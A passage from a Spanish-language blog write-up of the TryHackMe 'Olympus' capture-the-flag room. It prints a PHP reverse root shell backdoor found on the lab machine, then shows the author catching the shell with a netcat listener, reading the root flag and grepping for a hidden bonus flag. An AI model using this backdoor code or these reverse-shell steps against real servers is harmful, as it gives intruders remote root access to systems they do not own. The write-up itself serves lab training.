</span><span class="gp">set_time_limit(0);</span><span class="w">
</span><span class="go">
</span><span class="gp">$</span>host <span class="o">=</span> htmlspecialchars<span class="o">(</span><span class="s2">"</span><span class="nv">$_SERVER</span><span class="s2">[HTTP_HOST]</span><span class="nv">$_SERVER</span><span class="s2">[REQUEST_URI]"</span>, ENT_QUOTES, <span class="s2">"UTF-8"</span><span class="o">)</span><span class="p">;</span>
<span class="gp">if(!isset($</span>_GET[<span class="s2">"ip"</span><span class="o">])</span> <span class="o">||</span> <span class="o">!</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">"port"</span><span class="o">]))</span> die<span class="o">(</span><span class="s2">"&lt;h2&gt;&lt;i&gt;snodew reverse root shell backdoor&lt;/i&gt;&lt;/h2&gt;&lt;h3&gt;Usage:&lt;/h3&gt;Locally: nc -vlp [port]&lt;/br&gt;Remote: </span><span class="nv">$host</span><span class="s2">?ip=[destination of listener]&amp;port=[listening port]"</span><span class="o">)</span><span class="p">;</span>
<span class="gp">$</span>ip <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s2">"ip"</span><span class="o">]</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s2">"port"</span><span class="o">]</span><span class="p">;</span>
<span class="go">
</span><span class="gp">$</span>write_a <span class="o">=</span> null<span class="p">;</span>
<span class="gp">$</span>error_a <span class="o">=</span> null<span class="p">;</span>
<span class="go">
</span><span class="gp">$</span>suid_bd <span class="o">=</span> <span class="s2">"/lib/defended/libc.so.99"</span><span class="p">;</span>
<span class="gp">$</span>shell <span class="o">=</span> <span class="s2">"uname -a; w; </span><span class="nv">$suid_bd</span><span class="s2">"</span><span class="p">;</span>
<span class="go">
</span><span class="gp">chdir("/");</span><span class="w"> </span><span class="nb">umask</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
<span class="gp">$</span>sock <span class="o">=</span> fsockopen<span class="o">(</span><span class="nv">$ip</span>, <span class="nv">$port</span>, <span class="nv">$errno</span>, <span class="nv">$errstr</span>, 30<span class="o">)</span><span class="p">;</span>
<span class="gp">if(!$</span>sock<span class="o">)</span> die<span class="o">(</span><span class="s2">"couldn't open socket"</span><span class="o">)</span><span class="p">;</span>
<span class="go">
</span><span class="gp">$</span>fdspec <span class="o">=</span> array<span class="o">(</span>0 <span class="o">=&gt;</span> array<span class="o">(</span><span class="s2">"pipe"</span>, <span class="s2">"r"</span><span class="o">)</span>, 1 <span class="o">=&gt;</span> array<span class="o">(</span><span class="s2">"pipe"</span>, <span class="s2">"w"</span><span class="o">)</span>, 2 <span class="o">=&gt;</span> array<span class="o">(</span><span class="s2">"pipe"</span>, <span class="s2">"w"</span><span class="o">))</span><span class="p">;</span>
<span class="gp">$</span>proc <span class="o">=</span> proc_open<span class="o">(</span><span class="nv">$shell</span>, <span class="nv">$fdspec</span>, <span class="nv">$pipes</span><span class="o">)</span><span class="p">;</span>
<span class="go">
</span><span class="gp">if(!is_resource($</span>proc<span class="o">))</span> die<span class="o">()</span><span class="p">;</span>
<span class="go">
</span><span class="gp">for($</span><span class="nv">x</span><span class="o">=</span>0<span class="p">;</span><span class="nv">$x</span>&lt;<span class="o">=</span>2<span class="p">;</span><span class="nv">$x</span>++<span class="o">)</span> stream_set_blocking<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>x], 0<span class="o">)</span><span class="p">;</span>
<span class="gp">stream_set_blocking($</span>sock, 0<span class="o">)</span><span class="p">;</span>
<span class="go">
while(1)
{
</span><span class="gp">    if(feof($</span>sock<span class="o">)</span> <span class="o">||</span> feof<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1]<span class="o">))</span> <span class="nb">break</span><span class="p">;</span>
<span class="gp">    $</span>read_a <span class="o">=</span> array<span class="o">(</span><span class="nv">$sock</span>, <span class="nv">$pipes</span><span class="o">[</span>1], <span class="nv">$pipes</span><span class="o">[</span>2]<span class="o">)</span><span class="p">;</span>
<span class="gp">    $</span>num_changed_sockets <span class="o">=</span> stream_select<span class="o">(</span><span class="nv">$read_a</span>, <span class="nv">$write_a</span>, <span class="nv">$error_a</span>, null<span class="o">)</span><span class="p">;</span>
<span class="gp">    if(in_array($</span>sock, <span class="nv">$read_a</span><span class="o">))</span> <span class="o">{</span> <span class="nv">$i</span> <span class="o">=</span> fread<span class="o">(</span><span class="nv">$sock</span>, 1400<span class="o">)</span><span class="p">;</span> fwrite<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>0], <span class="nv">$i</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
<span class="gp">    if(in_array($</span>pipes[1], <span class="nv">$read_a</span><span class="o">))</span> <span class="o">{</span> <span class="nv">$i</span> <span class="o">=</span> fread<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1], 1400<span class="o">)</span><span class="p">;</span> fwrite<span class="o">(</span><span class="nv">$sock</span>, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
<span class="gp">    if(in_array($</span>pipes[2], <span class="nv">$read_a</span><span class="o">))</span> <span class="o">{</span> <span class="nv">$i</span> <span class="o">=</span> fread<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>2], 1400<span class="o">)</span><span class="p">;</span> fwrite<span class="o">(</span><span class="nv">$sock</span>, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
<span class="go">}

</span><span class="gp">fclose($</span>sock<span class="o">)</span><span class="p">;</span>
<span class="gp">for($</span><span class="nv">x</span><span class="o">=</span>0<span class="p">;</span><span class="nv">$x</span>&lt;<span class="o">=</span>2<span class="p">;</span><span class="nv">$x</span>++<span class="o">)</span> fclose<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>x]<span class="o">)</span><span class="p">;</span>
<span class="gp">proc_close($</span>proc<span class="o">)</span><span class="p">;</span>
<span class="gp">?&gt;</span><span class="w">
</span><span class="gp">zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$</span><span class="w"> 
</span></pre></table></code></div></div><p>Analizamos el código del fichero y vemos que en la primer línea se define una variable <em>$pass</em>, seguida de un bloque que la compara con el contenido del input <em>“password”</em> del form.</p><p>Volvemos al navegador, rellenamos el input con el valor de <em>$pass</em> y le damos al Enter. Nos aparece lo siguiente:</p><p><img data-src="/assets/posts/20220804/img10.png" alt="" data-proofer-ignore></p><p>Un mensaje con intrucciones para cargar una shell reversa que promete acceso como root. La puerta trasera de la que hablaba Prometheus quizas ?</p><p>Seguimos las instrucciones del mensaje</p><ul><li><p>Iniciamos un <strong>netcat</strong> escuchando en el puerto 4433 en este caso.</p><li><p>Cargamos la URL con la info necesaria.</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.18.xx.xx&amp;port=4433
</pre></table></code></div></div><p>Nos vamos al terminal con el <strong>nc</strong> que hemos puesto a escuchar en el puerto 4433 y una vez conectados empezamos a trastear:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4433
<span class="go">listening on [any] 4433 ...
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.129.191] 56506
</span><span class="gp">Linux olympus 5.4.0-109-generic #</span>123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
<span class="go"> 22:48:48 up  1:18,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/0    10.18.xx.xx      21:34   35:30   0.04s  0.04s -bash
whoami
root
</span><span class="gp">python3 -c "import pty;</span>pty.spawn<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span><span class="s2">"
</span><span class="gp">root@olympus:/#</span><span class="w"> </span><span class="s2">pwd
</span><span class="go">pwd
/
</span><span class="gp">root@olympus:/#</span><span class="w"> </span><span class="nb">cd </span>root
<span class="go">cd root
</span><span class="gp">root@olympus:/root#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">ls -la
total 44
drwx------  7 root root 4096 Apr 24 18:06 .
drwxr-xr-x 19 root root 4096 Mar 22 14:53 ..
</span><span class="gp">lrwxrwxrwx  1 root root    9 Mar 23 08:58 .bash_history -&gt;</span><span class="w"> </span>/dev/null
<span class="go">-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Mar 22 15:18 .cache
drwxr-xr-x  3 root root 4096 Mar 22 15:44 .local
-rw-------  1 root root 2866 Apr 24 18:06 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Mar 22 15:12 .ssh
drwxr-xr-x  3 root root 4096 Mar 22 15:26 config
-rw-r--r--  1 root root 1576 Apr 18 09:32 root.flag
drwx------  3 root root 4096 Mar 22 15:12 snap
</span><span class="gp">root@olympus:/root#</span><span class="w"> 
</span><span class="gp">root@olympus:/root#</span><span class="w"> </span><span class="nb">cat </span>root.flag
<span class="go">cat root.flag
</span><span class="gp">                    #</span><span class="c">## Congrats !! ###</span>
<span class="go">



                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
</span><span class="gp">           &gt;</span><span class="o">)</span>     <span class="o">))</span>/   |          <span class="o">)</span>/  <span class="se">\(</span><span class="o">(</span>  <span class="o">)</span> <span class="se">\</span>
<span class="go">           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
</span><span class="gp">             (\&gt;</span><span class="w">  </span>,<span class="s1">'/__      ))            __`.  /
</span><span class="go">            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
</span><span class="gp">            .  \. |&gt;</span><span class="w">  </span><span class="se">\ </span>     | __ |      /   &lt;|  /
<span class="go">                 )/    \____/ :..: \____/     \ &lt;
</span><span class="gp">          )   \ (|__  .      / ;</span>: <span class="se">\ </span>         __| <span class="o">)</span>  <span class="o">(</span>
<span class="go">         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
</span><span class="gp">                  &gt;</span><span class="w"> </span>:  |  ~V+-I_I_I-+V~  |  : <span class="o">(</span><span class="nb">.</span>
<span class="go">                 (  \:  T\   _     _   /T  : ./
</span><span class="gp">                  \  :    T^T T-+-T T^T    ;</span>&lt;
<span class="go">                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./          




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{xxxxxxxxxxxxxxxxxxxx}


</span><span class="gp">PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;</span><span class="o">)</span>
<span class="go">
                  (Hint : regex can be usefull)
</span><span class="gp">root@olympus:/root#</span><span class="w"> 
</span></pre></table></code></div></div><p>Tenemos la tercer flag.</p><p>Como parte del mensaje con la flag, nos cuentan que Prometheus ha dejado una cuarta bandera escondida en algun sitio y nos recomiendan logarnos como root sobre ssh para poder buscarla mediante algun comando basado en regex. Por otra parte, el hint de esta última bandera os dice que podría estar en el directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/etc</code> .</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="go">[...]
</span><span class="gp">root@olympus:/root#</span><span class="w"> </span><span class="nb">cd</span> /etc
<span class="go">cd /etc
</span><span class="gp">root@olympus:/etc#</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-irl</span> flag<span class="o">{</span>
<span class="go">grep -irl flag{
ssl/private/.b0nus.fl4g
</span><span class="gp">root@olympus:/etc#</span><span class="w"> </span><span class="nb">cat </span>ssl/private/.b0nus.fl4g
<span class="go">cat ssl/private/.b0nus.fl4g
Here is the final flag ! Congrats !

flag{xxxxxxxxxxxxxxxx}

As a reminder, here is a usefull regex :

grep -irl flag{

</span><span class="gp">Hope you liked the room ;</span><span class="o">)</span>
<span class="gp">root@olympus:/etc#</span><span class="w"> 
</span></pre></table></code></div></div><p>Significado de las flags del comando grep:</p><ul><li><code class="language-plaintext highlighter-rouge">-i</code> : Ignore case distinctions in patterns and input data.<li><code class="language-plaintext highlighter-rouge">-r</code> : Recursivo <em>Read all files under each directory, recursively</em>.<li><code class="language-plaintext highlighter-rouge">-l</code> : Suprime la salida normal y en su lugar imprime el nombre de cada archivo de entrada.</ul><h2 id="final"><span class="mr-2">Final</span><a href="#final" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Enhorabuena a los que habéis llegado hasta aquí. Espero que esta guía os haya resultado de ayuda.</p><p>Sed buenos si no hay una opción mejor.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/try-hack-me/'>Try Hack Me</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Try+Hack+Me+-+Olympus+-+Writeup+-+ewan67&url=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-olympus%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Try+Hack+Me+-+Olympus+-+Writeup+-+ewan67&u=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-olympus%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fewan67.github.io%2Fposts%2Fthm-writeup-olympus%2F&text=Try+Hack+Me+-+Olympus+-+Writeup+-+ewan67" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-writeup-tier1-three/">Hack The Box - Starting Point - Tier 1 - Three Writeup</a><li><a href="/posts/thm-writeup-brooklyn-nine-nine/">Try Hack Me - Brooklyn Nine Nine - Writeup</a><li><a href="/posts/thm-writeup-anonymous/">Try Hack Me - Anonymous - Writeup</a><li><a href="/posts/thm-writeup-olympus/">Try Hack Me - Olympus - Writeup</a><li><a href="/posts/thm-writeup-agentt/">Try Hack Me - Agent T - Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/chirpy/">chirpy</a> <a class="post-tag" href="/tags/github-pages/">github pages</a> <a class="post-tag" href="/tags/hola-mundo/">hola mundo</a> <a class="post-tag" href="/tags/jekyll/">jekyll</a> <a class="post-tag" href="/tags/tutos/">tutos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/thm-writeup-brooklyn-nine-nine/"><div class="card-body"> <em class="small" data-ts="1660613400" data-df="YYYY-MM-DD" > 2022-08-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Brooklyn Nine Nine - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con la máquina Brooklyn Nine Nine disponible en THM, un sencillo CTF creado por Fsociety2006 en el que pondremos en práctica técnicas de enumeración, esteganografía y ...</p></div></div></a></div><div class="card"> <a href="/posts/thm-writeup-anonymous/"><div class="card-body"> <em class="small" data-ts="1660649400" data-df="YYYY-MM-DD" > 2022-08-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Anonymous - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con la máquina Anonymous disponible en THM, un CTF de dificultad media creado por Nameless0ne en el que pondremos en práctica técnicas de enumeración y escalado de pri...</p></div></div></a></div><div class="card"> <a href="/posts/thm-writeup-b3dr0ck/"><div class="card-body"> <em class="small" data-ts="1662600600" data-df="YYYY-MM-DD" > 2022-09-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - b3dr0ck - Writeup</h3><div class="text-muted small"><p> En esta guía vamos a trabajar con la máquina b3dr0ck disponible en THM, un sencillo CTF creado por F11snipe en el que pondremos en práctica técnicas de enumeración, escalado de privilegios y utiliz...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tutorial-gh-pages/" class="btn btn-outline-primary" prompt="Anterior"><p>Tutorial Github Pages + Jekyll + Chirpy</p></a> <a href="/posts/thm-writeup-agentt/" class="btn btn-outline-primary" prompt="Nuevo"><p>Try Hack Me - Agent T - Writeup</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/ewan674">ewan67</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/chirpy/">chirpy</a> <a class="post-tag" href="/tags/github-pages/">github pages</a> <a class="post-tag" href="/tags/hola-mundo/">hola mundo</a> <a class="post-tag" href="/tags/jekyll/">jekyll</a> <a class="post-tag" href="/tags/tutos/">tutos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p><button type="button" class="btn btn-primary" aria-label="Update"> Actualizar </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
